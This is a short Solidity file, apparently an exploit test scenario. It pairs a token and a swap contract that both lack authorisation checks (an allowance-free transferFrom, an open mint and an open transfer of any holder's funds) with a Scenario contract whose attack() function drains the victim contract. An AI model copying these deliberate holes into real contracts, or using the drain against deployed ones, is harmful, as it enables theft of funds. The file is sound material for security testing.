// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
contract BonfireToken { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; function approve(address a,uint256 n) external returns(bool){allowance[msg.sender][a]=n;return true;} function transferFrom(address f,address t,uint256 n) external returns(bool){require(balanceOf[f]>=n);balanceOf[f]-=n;balanceOf[t]+=n;return true;} function mint(address a,uint256 n) external {balanceOf[a]+=n;} function transfer(address a,uint256 n) external returns(bool){require(balanceOf[msg.sender]>=n);balanceOf[msg.sender]-=n;balanceOf[a]+=n;return true;} }
contract BonfireSwap { BonfireToken public immutable asset; uint256 public reserve; address public immutable admin; constructor(BonfireToken a){asset=a;admin=msg.sender;}
function transfer(address holder,uint256 n,address beneficiary) external { asset.transferFrom(holder,address(this),n); asset.transfer(beneficiary,n); reserve+=n; }
}
contract Scenario { BonfireToken public asset; BonfireSwap public target; address public victim; uint256 public constant SEED=1000000 ether; constructor(){asset=new BonfireToken();target=new BonfireSwap(asset);victim=address(target); asset.mint(victim,SEED); asset.mint(address(this),SEED);}
function attack(address receiver) external { target.transfer(victim,SEED/2,receiver); }
function reserveBalance() external view returns(uint256){return asset.balanceOf(victim);}
function attackerBalance(address a) external view returns(uint256){return asset.balanceOf(a);}
function assetAddress() external view returns(address){return address(asset);}
}
